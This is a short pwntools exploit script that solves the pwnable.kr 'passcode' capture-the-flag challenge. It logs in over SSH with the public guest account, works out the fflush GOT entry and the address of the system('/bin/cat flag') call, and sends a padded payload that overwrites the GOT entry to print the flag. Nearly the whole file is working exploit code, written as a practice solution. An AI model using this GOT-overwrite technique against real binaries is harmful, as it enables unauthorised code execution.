#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
shell = ssh('passcode', 'pwnable.kr', password='guest', port=2222) # make ssh connection
# print shell['ls'] # flag passcode passcode.c
shell.download_file('./passcode') # download binary file
shell.download_file('./passcode.c') # download binary source code
e = ELF('./passcode')
rop = ROP(e)
main_addr = e.symbols['main']
log.info('main address : ' + hex(main_addr))
fflush_got = e.got['fflush']
log.info('fflush got address(hex) : ' + hex(fflush_got))
log.info('fflush got address(p32) : ' + str(p32(fflush_got)))
log.info(disasm(e.read(main_addr, 100)))
catflag_addr = main_addr+0x4d
log.info('\'system("/bin/cat flag")\' address(hex) : ' + hex(catflag_addr))
log.info('\'system("/bin/cat flag")\' address(int) : ' + str(catflag_addr))
# payload = '\x90'*96 + p32(fflush_got) + str(catflag_addr)
# payload = "(python -c 'print \"" + payload + "\"') | ./passcode"
payload = "(python -c 'print \"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x04\xa0\x04\x08134514147\"') | ./passcode"
# print payload
sh = shell.run(payload)
print sh.recvline()
print sh.recvline()
flag = sh.recvline()
print flag
print sh.recvline()
log.info('FLAG : ' + flag)
